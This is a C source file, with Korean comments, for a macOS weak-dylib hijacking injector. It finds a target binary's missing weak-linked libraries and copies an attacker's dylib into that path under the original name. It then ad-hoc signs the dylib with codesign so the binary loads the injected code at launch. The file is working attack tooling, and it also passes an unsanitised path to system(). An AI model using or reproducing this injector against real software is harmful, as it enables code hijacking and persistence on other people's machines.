#include "weak_dylib_injector.h"
#include "dylib_modifier.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>
#include <libgen.h>

/**
 * 상대 경로를 절대 경로로 변환합니다.
 * 바이너리 위치를 기준으로 합니다.
 */
static bool resolve_weak_dylib_path(const char *binary_path, const char *weak_dylib_path, char **out_resolved) {
    if (weak_dylib_path[0] == '/') {
        // 이미 절대 경로
        char *resolved = realpath(weak_dylib_path, NULL);
        if (resolved) {
            *out_resolved = resolved;
            return true;
        }
        
        // realpath 실패 시 상대 경로라고 가정하고 경로만 복사
        *out_resolved = strdup(weak_dylib_path);
        return true;
    } else if (strstr(weak_dylib_path, "@rpath") == weak_dylib_path ||
               strstr(weak_dylib_path, "@loader_path") == weak_dylib_path) {
        // @rpath 또는 @loader_path 형식
        char *binary_copy = strdup(binary_path);
        char *binary_dir = dirname(binary_copy);
        
        const char *relative_path = weak_dylib_path;
        
        // @loader_path/... 처리
        if (strstr(relative_path, "@loader_path") == relative_path) {
            relative_path += 12; // "@loader_path" 길이
            if (*relative_path == '/') relative_path++;
        }
        // @rpath/... 처리
        else if (strstr(relative_path, "@rpath") == relative_path) {
            relative_path += 6; // "@rpath" 길이
            if (*relative_path == '/') relative_path++;
        }
        
        char resolved[4096];
        snprintf(resolved, sizeof(resolved), "%s/%s", binary_dir, relative_path);
        
        char *result = realpath(resolved, NULL);
        if (result) {
            *out_resolved = result;
        } else {
            // realpath 실패 시 경로만 사용
            *out_resolved = strdup(resolved);
        }
        
        free(binary_copy);
        return true;
    } else {
        // 상대 경로
        char *binary_copy = strdup(binary_path);
        char *binary_dir = dirname(binary_copy);
        
        char resolved[4096];
        snprintf(resolved, sizeof(resolved), "%s/%s", binary_dir, weak_dylib_path);
        
        char *result = realpath(resolved, NULL);
        if (result) {
            *out_resolved = result;
        } else {
            *out_resolved = strdup(resolved);
        }
        
        free(binary_copy);
        return true;
    }
}

/**
 * Weak Dylib 주입 가능한 위치 찾기
 */
bool analyze_weak_dylib_vulnerability(
    const char *binary_path,
    char **weak_dylibs,
    size_t weak_dylib_count,
    char **out_injection_path) {
    
    if (weak_dylib_count == 0) {
        fprintf(stderr, "[ERROR] Weak Dylib 취약 경로가 없습니다.\n");
        return false;
    }
    
    printf("\n[*] Weak Dylib 취약점 분석...\n");
    printf("   발견된 취약 Weak Dylib: %zu개\n", weak_dylib_count);
    
    for (size_t i = 0; i < weak_dylib_count; i++) {
        printf("   [%zu] %s\n", i + 1, weak_dylibs[i]);
    }
    
    // 첫 번째 weak dylib 경로를 사용 (이상적으로는 사용자가 선택)
    char *resolved = NULL;
    if (!resolve_weak_dylib_path(binary_path, weak_dylibs[0], &resolved)) {
        fprintf(stderr, "[ERROR] Weak Dylib 경로 변환 실패: %s\n", weak_dylibs[0]);
        return false;
    }
    
    *out_injection_path = resolved;
    printf("   → 재해석된 경로: %s\n", resolved);
    return true;
}

/**
 * Weak Dylib을 통한 dylib 주입
 * 
 * 동작 과정:
 * 1. 취약한 Weak Dylib 경로들 분석
 * 2. 첫 번째 경로에 우리의 dylib 배치
 * 3. install_name을 설정하여 원래 dylib처럼 보이게 함
 * 
 * Weak Dylib의 특성:
 * - 로드 실패해도 바이너리가 계속 실행됨
 * - 따라서 우리가 임의의 경로에 dylib을 배치할 수 있음
 * - 코드 가로채기 가능
 */
bool inject_via_weak_dylib(
    const char *source_dylib,
    const char *binary_path,
    char **weak_dylibs,
    size_t weak_dylib_count,
    const char *original_dylib_name) {
    
    char *injection_path = NULL;
    if (!analyze_weak_dylib_vulnerability(binary_path, weak_dylibs, weak_dylib_count, &injection_path)) {
        return false;
    }
    
    printf("\n[*] Weak Dylib 주입 시작...\n");
    printf("   취약 경로: %s\n", injection_path);
    printf("   원본 dylib 이름: %s\n", original_dylib_name);
    
    // injection_path의 디렉토리와 파일명 분리
    char *path_copy = strdup(injection_path);
    char *dir = dirname(path_copy);
    
    // 최종 dylib 경로 (원본 이름으로 배치)
    char final_dylib_path[1024];
    snprintf(final_dylib_path, sizeof(final_dylib_path), "%s/%s", dir, original_dylib_name);
    
    printf("   주입 위치: %s\n", final_dylib_path);
    
    // 1단계: dylib 복사 (이것이 핵심!)
    printf("\n[*] 단계 1: dylib 복사\n");
    if (!copy_dylib(source_dylib, final_dylib_path)) {
        free(injection_path);
        free(path_copy);
        return false;
    }
    
    printf("\n[*] 단계 2: 코드 서명 (필요한 경우)\n");
    char codesign_cmd[1024];
    snprintf(codesign_cmd, sizeof(codesign_cmd), 
             "codesign -f -s - '%s' 2>&1", final_dylib_path);
    
    if (system(codesign_cmd) == 0) {
        printf("[✓] 코드 서명 완료\n");
    } else {
        printf("[WARNING] 코드 서명 실패 (SIP 보호일 수 있음)\n");
    }
    
    printf("\n[✓] Weak Dylib 주입 완료!\n");
    printf("   바이너리가 %s을 로드하려고 할 때 자동으로 우리 dylib을 발견합니다\n", 
           original_dylib_name);
    
    free(injection_path);
    free(path_copy);
    return true;
}
